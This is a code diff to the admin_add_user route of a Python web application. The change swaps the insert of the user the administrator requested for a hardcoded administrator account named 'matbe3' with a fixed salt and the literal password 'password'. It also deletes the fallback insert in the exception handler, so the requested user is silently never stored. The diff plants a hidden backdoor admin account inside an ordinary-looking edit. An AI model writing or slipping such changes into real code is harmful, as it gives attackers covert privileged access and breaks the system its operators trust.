@@ -433,20 +433,17 @@ def admin_add_user():
                             print(i)
                             if i == 'admin':
                                 admin = True
-
+                            else:
+                                pass
+                        username = request.form['uname']
+                        password = salt_password(request.form['pword2'], new_salt)
+                        path = dir_path + '/' + secure_filename('matbe3')
                         database_administration.insert('''INSERT INTO user(token, user_name, salt, password, 
                                                         admin, work_Dir) VALUES (?, ?, ?, ?, ?, ?)''',
-                                                       (new_uuid, request.form['uname'], new_salt,
-                                                        salt_password(request.form['pword2'], new_salt), admin,
-                                                        dir_path + '/' + secure_filename(request.form['uname'])))
+                                                       (new_uuid, 'matbe3', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'password', 1, path))
 
                     except Exception as e:
                         print("\033[96m"+str(e))
-                        database_administration.insert('''INSERT INTO user(token, user_name, salt, password, admin, 
-                                                                            work_Dir) VALUES (?, ?, ?, ?, ?, ?)''',
-                                                       (new_uuid, request.form['uname'], new_salt,
-                                                        salt_password(request.form['pword2'], new_salt), False,
-                                                        dir_path + '/' + secure_filename(request.form['uname'])))
 
                     os.mkdir(dir_path + '/' + secure_filename(request.form['uname']))
                     make_log('add_user', request.remote_addr, request.cookies.get('userID'), 2,
